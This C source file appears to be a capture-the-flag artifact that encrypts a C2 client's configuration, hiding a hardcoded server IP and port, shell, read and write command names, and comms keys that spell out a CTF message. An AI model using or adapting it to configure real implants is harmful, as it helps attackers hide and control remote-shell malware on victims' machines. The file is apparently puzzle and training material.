// config_generator.c - Tool to generate encrypted configuration
// Compile with: gcc config_generator.c -o config_generator -lmbedcrypto

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mbedtls/aes.h>

#define AES_BLOCK_SIZE 16
#define KEY_SIZE 32  // 256-bit key

// Master key - must match the one in the client
const unsigned char master_key[KEY_SIZE] = {
    0xd6, 0x29, 0x87, 0x4c, 0xa5, 0xf3, 0x71, 0xb9,
    0xe8, 0x54, 0x32, 0x0f, 0xc1, 0x6a, 0xb5, 0x7d,
    0x91, 0x3e, 0x8a, 0x2c, 0xb4, 0x57, 0x69, 0xdf,
    0x3a, 0x84, 0x72, 0xf1, 0xc6, 0x9e, 0x4b, 0x25
};

// IV for config encryption - must match the one in client
const unsigned char config_iv[AES_BLOCK_SIZE] = {
    0x35, 0x7c, 0x94, 0xaf, 0x66, 0xd2, 0x87, 0x15,
    0xc8, 0x4b, 0x9e, 0x23, 0x5d, 0x7a, 0xf1, 0xb8
};

// Configuration to encrypt
const char server_addr[] = "139.59.228.105";
const uint16_t server_port = 443;
const char cmd_shell[] = "EXIT";
const char cmd_read[] = "WRITE";
const char cmd_write[] = "READ";
const char cmd_exit[] = "SHELL";

// AES key and IV that the client will use for C2 communication
const unsigned char aes_key[KEY_SIZE] = {
    0x4c, 0x75, 0x63, 0x6b, 0x79, 0x20, 0x53, 0x74,
    0x61, 0x72, 0x20, 0x77, 0x61, 0x73, 0x20, 0x68,
    0x65, 0x72, 0x65, 0x2c, 0x20, 0x43, 0x54, 0x46,
    0x20, 0x6b, 0x65, 0x79, 0x20, 0x33, 0x37, 0x21
};

const unsigned char aes_iv[AES_BLOCK_SIZE] = {
    0x42, 0x61, 0x64, 0x20, 0x52, 0x61, 0x6e, 0x64,
    0x6f, 0x6d, 0x20, 0x49, 0x56, 0x20, 0x3a, 0x29
};

// Function to pad data to AES block size
size_t pad_data(unsigned char *input, size_t input_len, unsigned char *output) {
    size_t padded_len = (input_len / AES_BLOCK_SIZE + 1) * AES_BLOCK_SIZE;
    size_t padding_len = padded_len - input_len;
    
    memcpy(output, input, input_len);
    // PKCS7 padding
    memset(output + input_len, padding_len, padding_len);
    
    return padded_len;
}

int main() {
    mbedtls_aes_context aes;
    unsigned char config_block[512] = {0};
    unsigned char padded_block[512] = {0};
    unsigned char encrypted_block[512] = {0};
    size_t config_size = 0;
    size_t padded_size = 0;
    
    // Build configuration block
    // Server address
    strcpy((char *)config_block, server_addr);
    config_size += strlen(server_addr) + 1;
    
    // Server port
    memcpy(config_block + config_size, &server_port, sizeof(server_port));
    config_size += sizeof(server_port);
    
    // Command strings
    strcpy((char *)config_block + config_size, cmd_shell);
    config_size += strlen(cmd_shell) + 1;
    
    strcpy((char *)config_block + config_size, cmd_read);
    config_size += strlen(cmd_read) + 1;
    
    strcpy((char *)config_block + config_size, cmd_write);
    config_size += strlen(cmd_write) + 1;
    
    strcpy((char *)config_block + config_size, cmd_exit);
    config_size += strlen(cmd_exit) + 1;
    
    // Comms AES key
    memcpy(config_block + config_size, aes_key, KEY_SIZE);
    config_size += KEY_SIZE;
    
    // Comms AES IV
    memcpy(config_block + config_size, aes_iv, AES_BLOCK_SIZE);
    config_size += AES_BLOCK_SIZE;
    
    // Pad data
    padded_size = pad_data(config_block, config_size, padded_block);
    
    // Initialize AES
    mbedtls_aes_init(&aes);
    mbedtls_aes_setkey_enc(&aes, master_key, KEY_SIZE * 8);
    
    // Encrypt data
    unsigned char iv[AES_BLOCK_SIZE];
    memcpy(iv, config_iv, AES_BLOCK_SIZE);
    
    for (size_t i = 0; i < padded_size; i += AES_BLOCK_SIZE) {
        mbedtls_aes_crypt_cbc(&aes, MBEDTLS_AES_ENCRYPT, AES_BLOCK_SIZE,
                             iv, padded_block + i, encrypted_block + i);
    }
    
    // Print encrypted configuration as C array
    printf("// Encrypted configuration block\n");
    printf("const encrypted_config_t g_encrypted_config = {\n");
    printf("    .data = {\n        ");
    
    for (size_t i = 0; i < padded_size; i++) {
        printf("0x%02x", encrypted_block[i]);
        if (i < padded_size - 1)
            printf(", ");
        
        if ((i + 1) % 16 == 0 && i < padded_size - 1)
            printf("\n        ");
    }
    
    printf("\n    },\n");
    printf("    .length = %zu\n", padded_size);
    printf("};\n");
    
    mbedtls_aes_free(&aes);
    return 0;
}
